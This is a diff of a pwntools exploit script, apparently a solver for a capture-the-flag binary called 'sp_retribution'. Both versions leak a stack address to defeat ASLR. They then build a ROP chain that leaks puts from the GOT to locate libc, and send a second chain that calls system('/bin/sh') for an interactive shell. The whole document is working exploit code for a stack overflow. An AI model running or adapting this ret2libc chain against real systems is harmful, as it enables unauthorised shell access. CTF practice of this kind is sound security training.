@@ -8,6 +8,7 @@ context.arch = 'amd64'
 fname = './sp_retribution' 
 elf = context.binary = ELF(fname, checksec=False)
 libc = elf.libc
+
 os.system('clear')
 
 if len(sys.argv) < 2:
@@ -20,33 +21,35 @@ else:
   r    = remote(IP, PORT)
   print(f'Running solver remotely at {IP} {PORT}\n')
 
-# Send shellcode
-r.sendlineafter(b'>>', b'2')
-r.sendlineafter(b'y = ', b'A'*7) # note that the ending '\n' is also passed to read()
-rev_data = r.recvuntil(b'(y/n): ').split(b'\n')
-binary_base_raw = rev_data[-2]
-binary_base = u32(binary_base_raw[2:]) << 16
-elf.address = binary_base
-success(f'Binary base @ {hex(elf.address)}\n')
-rop = ROP(elf)
+r.sendlineafter(b'>> ', b'2')
+r.sendlineafter(b'y = ', b'A'*7)
+data = r.recvuntil(b'(y/n): ').split(b'\n')
+addr_on_stack_p = data[-2]
+# print(len(addr_on_stack_p) # 6
+addr_on_stack = u64(addr_on_stack_p + b'\x00\x00')
+bin_base = addr_on_stack >> 16 << 16
+success(f'Binary base @ {hex(bin_base)}')
+elf.address = bin_base
 
+rop = ROP(elf)
 payload = b'\x90' * 88
 payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
 payload += p64(elf.got.puts)
 payload += p64(elf.plt.puts)
 payload += p64(elf.symbols.missile_launcher)
-
 r.sendline(payload)
-r.recvlines(2)
-libc.address = u64(r.recvline().strip().ljust(8, b'\x00')) - libc.sym.puts
-success(f'Libc base @ {hex(libc.address)}\n')
 
-sc = b'\x90' * 88
-sc += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
-sc += p64(next(libc.search(b'/bin/sh'))) # /bin/bash
-sc += p64(libc.symbols.system)
+data = r.recvuntil(b'y = ').split(b'\n')
+# print(len(data[2])) => 6
+addr_puts = u64(data[2] + b'\x00\x00')
+libc_base = addr_puts - libc.symbols.puts
+libc.address = libc_base
+
+payload = b'\x90' * 88
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+payload += p64(next(libc.search('/bin/sh')))
+payload += p64(libc.symbols.system)
 r.sendlineafter(b'y = ', b'')
-r.sendlineafter(b'(y/n): ', sc)
+r.sendlineafter(b'(y/n): ', payload)
 
-pause(1)
 r.interactive()
